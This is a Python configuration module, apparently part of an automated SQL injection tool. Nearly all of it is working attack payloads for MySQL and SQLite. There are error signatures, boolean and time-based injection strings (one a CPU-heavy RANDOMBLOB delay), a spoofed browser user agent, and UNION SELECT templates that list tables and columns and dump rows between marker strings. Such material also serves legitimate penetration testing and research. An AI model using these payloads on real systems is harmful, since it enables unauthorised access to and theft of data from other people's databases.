BOLD = "\033[1m"
RED = "\033[0;31m"
CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
YELLOW = "\033[0;33m"
RESET = "\033[0m"

HTTP_METHODS = {"GET", "POST"}

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) "
    "Gecko/20100101 Firefox/146.0"
)

ERROR_BASED = {
    "mysql": ["you have an error in your sql syntax;", "warning: mysql"],
    "sqlite": ["sqlite3.operationalerror", "sqlite_error: near"],
}

BOOLEAN_BASE = {
    "mysql": ["' AND 1=2 -- -", "' OR 1=1 -- -"],
    "sqlite": ["')) AND 1=2 -- -", "')) OR 1=1 -- -"],
}

TIME_BASED = {
    "mysql": "' AND SLEEP(5) -- -",
    "sqlite": (
        "')) OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2)))) -- -"
    ),
}

COLS_ERRORS = {
    "mysql": (
        "the used select statements "
        "have a different number of columns"
    ),
    "sqlite": (
        "selects to the left and right of union do "
        "not have the same number of result columns"
    ),
}

SYSTEM_DBS = {"information_schema", "mysql", "performance_schema", "sys"}

START = "vaccinestart"
END = "vaccineend"

UNION_BASED = {
    "mysql": {
        "select": "' AND 1=2 UNION SELECT ",
        "tables": {
            "expr": (
                "GROUP_CONCAT"
                "('{start}'"
                ",table_schema,'.',table_name,"
                "'{end}')"
            ),
            "from": (
                "information_schema.tables "
                "WHERE table_schema "
                "NOT IN ({system_dbs})"
            ),
        },
        "columns": {
            "expr": "GROUP_CONCAT('{start}',column_name,'{end}') ",
            "from": (
                "information_schema.columns "
                "WHERE table_schema='{db}' "
                "AND table_name='{table}'"
            ),
        },
        "dump": {
            "expr": (
                "CONCAT('{start}',{columns},'{end}') "
            ),
            "from": "{db}.{table} LIMIT 1 OFFSET {offset}",
        },
    },
    "sqlite": {
        "select": "')) AND 1=2 UNION SELECT ",
        "tables": {
            "expr": "group_concat('{start}'||name||'{end}') ",
            "from": "sqlite_master WHERE type='table'",
        },
        "columns": {
            "expr": "group_concat('{start}'||name||'{end}') ",
            "from": "pragma_table_info('{table}')",
        },
        "dump": {
            "expr": "'{start}'||{columns}||'{end}' ",
            "from": "{table}",
        },
    },
}
